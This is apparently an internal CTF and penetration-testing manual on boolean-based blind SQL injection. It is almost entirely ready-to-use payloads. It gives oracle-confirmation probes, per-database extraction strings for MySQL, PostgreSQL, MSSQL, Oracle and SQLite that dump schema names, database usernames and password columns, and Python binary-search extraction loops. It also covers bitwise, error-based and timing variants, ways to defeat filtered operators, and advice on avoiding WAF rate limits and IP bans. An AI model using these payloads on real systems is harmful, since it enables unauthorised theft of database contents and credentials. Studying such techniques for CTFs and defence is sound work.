# Boolean-based blind SQLi — the full manual

The page answers yes/no and nothing else: no reflected column, no
error text, no sleep needed. Every question you ask is `AND <expr>` —
true renders the normal page, false renders the other one. The whole
technique is turning "what is the data" into a sequence of yes/no
questions, then minimising how many you ask.

Two rules before extracting anything:

1. The true/false pair must be REPRODUCED — `AND 1=1` vs `AND 1=2`
   must flip the page reliably 3 times in a row before you spend
   1000 requests on extraction.
2. Never extract by linear scan (`='a'`, `='b'`...) — 30+ requests
   per character. Binary search is ~7 per character; bitwise is ~8
   but parallelises and survives `>` filtering.

---

## 1. Confirming the oracle

```text
numeric:   id=1 AND 1=1        vs   id=1 AND 1=2
string:    id=1' AND '1'='1    vs   id=1' AND '1'='2
paren:     id=1) AND (1=1      vs   id=1) AND (1=2
```

The TRUE page must equal baseline; FALSE must differ in a STABLE way
(shorter body, missing block, 500, different title). Pick your
comparator from the diff — a status code, a marker string
("Welcome", "record found", "class=results"), or a byte-length
delta bigger than page jitter.

Ad-heavy pages ruin length comparators: hash the marker region
instead, or compare a regex for a string that only exists on TRUE.

Also prove the oracle is YOUR doing: `AND 5=6` false, `AND 5=5`
true — arithmetic only a query can answer. An always-200 page that
never changes is not an oracle, it is a dead end.

---

## 2. The extraction grammar

```sql
SUBSTRING / SUBSTR / MID    -- char at position
ASCII / ORD / UNICODE       -- char -> code
LENGTH / LEN / CHAR_LENGTH  -- value length
```

### MySQL

```sql
' AND LENGTH(database())>5-- -
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables
   WHERE table_schema=database() LIMIT 0,1),1,1))>100-- -
' AND ORD(MID((SELECT password FROM users LIMIT 0,1),3,1))>77-- -
```

`MID`, `SUBSTR`, `SUBSTRING` all work; `ORD` = `ASCII` but also
handles multibyte.

### PostgreSQL

```sql
' AND LENGTH(current_database())>5-- -
' AND ASCII(SUBSTRING((SELECT usename FROM pg_user LIMIT 1),1,1))>77-- -
' AND ASCII(SUBSTR((SELECT column_name FROM information_schema.columns
   WHERE table_name='users' LIMIT 1),2,1))>77-- -
```

PG has no IF(), uses CASE: `AND (CASE WHEN cond THEN true ELSE
false END)`.

### MSSQL

```sql
' AND LEN(db_name())>5-- -
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases),1,1))>77-- -
' AND UNICODE(SUBSTRING((SELECT TOP 1 name FROM sys.tables),3,1))>77-- -
```

`TOP 1` not `LIMIT 1`. `UNICODE` for nvarchar.

### Oracle

```sql
' AND LENGTH((SELECT banner FROM v$version WHERE rownum=1))>5-- -
' AND ASCII(SUBSTR((SELECT table_name FROM all_tables WHERE
   rownum=1),1,1))>77-- -
```

Oracle needs `FROM dual` for scalar probes:
`' AND (SELECT 1 FROM dual WHERE ASCII(SUBSTR(user,1,1))>77)=1-- -`

### SQLite

```sql
' AND LENGTH((SELECT name FROM sqlite_master LIMIT 1))>3-- -
' AND unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))>97-- -
' AND hex(substr((SELECT flag FROM secrets LIMIT 1),1,1))>'4'-- -
```

SQLite `unicode()` not `ASCII()`; `hex()` returns TEXT — compare
as string.

---

## 3. The extraction loops

### 3a. Binary search on ASCII — the standard

~7 requests per char, works everywhere ASCII() exists:

```python
def char_at(pos, subq):
    lo, hi = 32, 126                      # printable ASCII band
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"' AND ASCII(SUBSTRING(({subq}),{pos},1))>{mid}-- -"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if lo > 32 else None   # lo==32 with no true = end
```

Get the length first — `LENGTH(x)>0`, `>8`, `>16`... binary-search it
too (~8 requests total) so you know when to stop instead of guessing
a cutoff.

### 3b. Bitwise extraction — survives `>` filtering

When `>` / `<` are filtered but `&` is not:

```sql
' AND ASCII(SUBSTRING(({Q}),{pos},1)) & 64 = 64-- -   -- bit 6 set?
' AND (ASCII(SUBSTRING(({Q}),{pos},1)) >> 5) & 1-- -  -- same, shift form
' AND ORD(MID(({Q}),{pos},1)) & {mask}-- -
```

One request per bit, 7 bits per ASCII char → 7 requests/char, same
as binary search but no comparison operators needed. Bit order MSB→LSB
or LSB→MSB — either works, collect all 7.

### 3c. CHAR/IN comparison sets — fewer requests per char

Divide the charset, not the codepoint space:

```sql
' AND SUBSTRING(({Q}),{pos},1) IN ('a','b','c','d')-- -     -- quarter-split
' AND SUBSTRING(({Q}),{pos},1) REGEXP '^[a-f]'-- -          -- MySQL
' AND SUBSTRING(({Q}),{pos},1) LIKE '[a-f]'-- -             -- MSSQL pattern
```

8 requests split 128 chars → log2-ish behaviour with worse constants
than binary search; only useful when `>` is gone and `IN`/`LIKE` live.

### 3d. Conditional error / conditional content — oracle in disguise

Same yes/no, different vehicle, useful when true/false pages are
identical but errors differ:

```sql
' AND (SELECT CASE WHEN (cond) THEN 1 ELSE 1/0 END)=1-- -   -- PG/MSSQL: 500 vs 200
' AND (SELECT IF(cond,1,(SELECT 1 UNION SELECT 2)))=1-- -   -- MySQL
' AND cond AND (SELECT '' FROM users WHERE 1/0=1)-- -        -- divide-by-zero
```

`1/0` in MySQL returns NULL not error by default — in Postgres/MSSQL
it errors. Oracle: `TO_NUMBER('x')` as the error path.

---

## 4. Enumeration order (blind)

```sql
-- length of current db name
' AND LENGTH(database())>8-- -
-- then its name
' AND ASCII(SUBSTRING(database(),1,1))>100-- -   ...per char

-- count of tables
' AND (SELECT COUNT(table_name) FROM information_schema.tables
   WHERE table_schema=database())>10-- -

-- i-th table name
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables
   WHERE table_schema=database() LIMIT {i},1),{pos},1))>{mid}-- -

-- column names of the target
' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns
   WHERE table_name='{t}' AND table_schema=database()
   LIMIT {i},1),{pos},1))>{mid}-- -

-- the data
' AND ASCII(SUBSTRING((SELECT {col} FROM {t} LIMIT {i},1),{pos},1))>{mid}-- -
```

`LIMIT i,1` paging needs a deterministic order — add `ORDER BY
table_name` inside the subquery or rows shuffle between requests and
you re-extract the same row.

MySQL `information_schema` string comparisons are case-insensitive on
default collation — when you extract names char-by-char the page may
say true for both 'A' and 'a'. Force binary collation:

```sql
' AND ASCII(SUBSTRING(BINARY table_name,{pos},1))>{mid}-- -
' AND BINARY SUBSTRING(({Q}),{pos},1)>'{midc}'-- -
```

Same trick for LIKE: `LIKE BINARY 'a%'`.

---

## 5. Speed-ups that matter

- **Ask for the answer in bulk.** `ASCII(SUBSTRING(...))` per char
  vs `CONV(HEX(value),16,10)` per value — one numeric question per
  ROW not per char when the value is short:
  `' AND (SELECT CONV(HEX(flag),16,10) FROM secrets)>12345-- -`
  binary-search the whole number in ~40 requests total, not 7/char.
- **Compress then hex.** `HEX(COMPRESS(flag))` halves length; you
  decompress locally. (MySQL.)
- **Batch with CASE.** One request can ask many questions when the
  answer channel is position: response length / title / different
  pages all carry >1 bit of information if you control the sink.
  Usually not worth the engineering in a CTF — binary search is
  enough.
- **Know the alphabet.** Flags are `[a-z0-9_{}]` ~38 chars →
  first question `>96`? (`{}`/`_` are above) — ordering the charset
  by likelihood saves ~1 request/char. `tools/web/sqli_extract.py`
  does the binary search and logs every request as evidence.

---

## 6. When the page is identical (no boolean signal)

| Variant | Mechanism |
|---|---|
| conditional error | `CASE WHEN cond THEN 1/0 END` → 500 vs 200 |
| conditional heavy query | `AND cond AND BENCHMARK(2e6,SHA1('x'))` → timing |
| conditional content | `AND IF(cond,(SELECT 'EXTRA_TEXT'),'')` lands in markup |
| conditional redirect | response Location differs |
| conditional order | result SET ORDER changes (`ORDER BY IF(cond,a,b)`) |

If even errors and timing are identical → no oracle exists here;
route to `oob.md` (DNS/HTTP exfil) or re-check the injection point —
it may not be in a query at all.

---

## 7. Practical pitfalls

- **CSRF token in the page** makes every response differ — compare a
  marker string, not the body hash.
- **Login-required param** — session cookie must be in every probe;
  session-expired 302 looks like FALSE to a naive comparator.
- **WAF counts requests** — 500 blind probes → IP ban. Budget:
  `tools/web/sqli_extract.py` logs counts; watch for 403 drift.
- **Unicode values** — ASCII() of a UTF-8 char gives the BYTE, not
  the codepoint: extract `HEX()` of the value instead, decode
  locally.
- **NULL rows** — `SUBSTRING(NULL,..)` is NULL → false either way;
  check `IS NULL`/`IS NOT NULL` probes to tell "no row" from "no
  match".
- **Case-insensitive comparisons** — `SUBSTRING(x,1,1)='A'` is true
  for 'a' under default MySQL collation → use `BINARY` or `ASCII()`.

---

## 8. Evidence standard

`tools/web/sqli_extract.py` is the sanctioned path: it requires a
recorded true/false pair before spending requests, runs the binary
search, and logs each request + response marker so the extraction
carries its own evidence. sqlmap `-T table --dump` output is a
claim, not evidence — keep the request/response pairs.

---

## 9. Extraction loop — the pseudocode

The binary-search skeleton that works for any oracle:

```text
for position i = 1..maxlen:
    lo, hi = 32, 126                    # printable range
    while lo < hi:
        mid = (lo + hi) // 2
        cond = ascii(substring(secret, i, 1)) > mid
        if probe(cond) is TRUE:  lo = mid + 1
        else:                    hi = mid
    char[i] = chr(lo)
    # if chr(lo) unprintable and > max expected — the string ended;
    # break early on 3 consecutive boundary hits
```

Probe call per DBMS:

```sql
-- MySQL:
' AND ASCII(SUBSTRING((SELECT flag FROM secrets LIMIT 1),{i},1))>{mid}-- -
-- PG:
' AND ASCII(SUBSTRING((SELECT flag FROM secrets LIMIT 1),{i},1))>{mid}-- -
-- MSSQL:
' AND UNICODE(SUBSTRING((SELECT TOP 1 flag FROM secrets),{i},1))>{mid}-- -
   -- MSSQL UNICODE() = ascii for BMP; ASCII() doesn't exist
-- Oracle:
' AND ASCII(SUBSTR((SELECT flag FROM secrets WHERE ROWNUM=1),{i},1))>{mid}-- -
-- SQLite:
' AND UNICODE(SUBSTR((SELECT flag FROM secrets LIMIT 1),{i},1))>{mid}-- -
```

Length pre-probe (one pass before the loop):

```sql
' AND LENGTH((SELECT flag FROM secrets LIMIT 1))>{n}-- -
' AND LENGTH((SELECT flag FROM secrets LIMIT 1))={n}-- -
```

Then loop `i` from 1..length instead of a guessed max — kills the
early-break ambiguity.

The parallel question: `sqli_extract.py` runs sequential — parallel
probing (4-8 threads) speeds the loop BUT:

- on a shared CTF instance parallel requests count as one logical
  attack; some WAFs rate-limit per-IP → slow down to sequential
- the oracle may be unstable under load (a slow page returns
  timeout = false → wrong bit)
- keep parallel ≤ 4 and re-verify the last char extracted before
  moving on

---

## 10. The charset shortcut — before the loop runs

Flags have shapes. Knowing the charset cuts the search space:

```text
flag{...}        → alphabet [a-z0-9_}] ≈ 38 chars → 6 req/char
hex digest       → [0-9a-f] ≈ 16 → 4 req/char
base64           → [A-Za-z0-9+/=] ≈ 65 → 7 req/char
wordlist value   → dictionary probes, not charset probes
```

Probe the charset FIRST:

```sql
' AND (SELECT flag FROM secrets) REGEXP '^[0-9a-f]+$'-- -   -- hex?
' AND (SELECT flag FROM secrets) REGEXP '^flag\{[a-z0-9_]+\}$'-- -
' AND (SELECT flag FROM secrets) LIKE '%{%'-- -              -- has braces
' AND (SELECT flag FROM secrets) LIKE BINARY '%[A-Z]%'-- -   -- has upper?
```

Match → drop to the known charset; the loop halves its request
count.

---

## 11. The one-bit upgrade — multi-value probes

Where the alphabet is small, `IN`/`BETWEEN` probe a whole slice in
one request:

```sql
-- 8 candidate chars in one probe (digits half):
' AND SUBSTRING((SELECT flag),{i},1) IN
   ('0','1','2','3','4','5','6','7')-- -
-- range half:
' AND SUBSTRING((SELECT flag),{i},1) BETWEEN 'a' AND 'm'-- -
-- charset-specific:
' AND SUBSTRING((SELECT flag),{i},1) IN
   ('a','b','c','d','e','f')-- -        -- hex letters
```

That's a 3-bit probe instead of 1 — the loop converges in ~4
requests/char for hex alphabets.

---

## 12. Row-count oracle — extract without substring

When the response shows a LISTING (count visible in the page), the
oracle is "how many rows match":

```sql
' UNION SELECT NULL,NULL,NULL FROM secrets WHERE flag LIKE 'f%'-- -
   -- union rows show up in the listing count
' AND (SELECT COUNT(*) FROM secrets WHERE flag LIKE 'f%')>0-- -
' AND EXISTS(SELECT 1 FROM secrets WHERE flag LIKE 'f%')-- -
' AND EXISTS(SELECT 1 FROM secrets WHERE
   SUBSTRING(flag,{i},1)='x')-- -
```

`LIKE 'f%'`+`EXISTS` is the "does any row start with f" oracle —
then `flag{a%`, `flag{b%` ... walks the prefix.

---

## 13. Second-order blind — when the READ is the oracle

Stored value → consumed later → the rendered page is the oracle.
Same binary search, but each probe is a write+read pair:

```text
write: name = x'||(SELECT CASE WHEN cond THEN 'T' ELSE 'F' END)||'
read:  GET /profile  →  "xT" vs "xF" rendered
```

`second-order.md` for the full stored loop.

---

## 14. Verify-the-extraction step — never trust a single channel

After the loop produces a candidate value:

```text
1. re-probe the value: ' AND (SELECT flag)=?quoted-value-- - → TRUE
2. use a second channel: if boolean extracted it, confirm the
   first 8 chars via error-echo or OOB — a substring match across
   channels = real extraction
3. check the charset — 'flag{' prefix present? plausible shape?
4. submit the candidate to the flag gate — hooks.py pre-flag
```

A loop that converged on all-zeros or all-spaces = the oracle
flipped or went silent — restart with a fresh true/false pair, not
with more payloads.
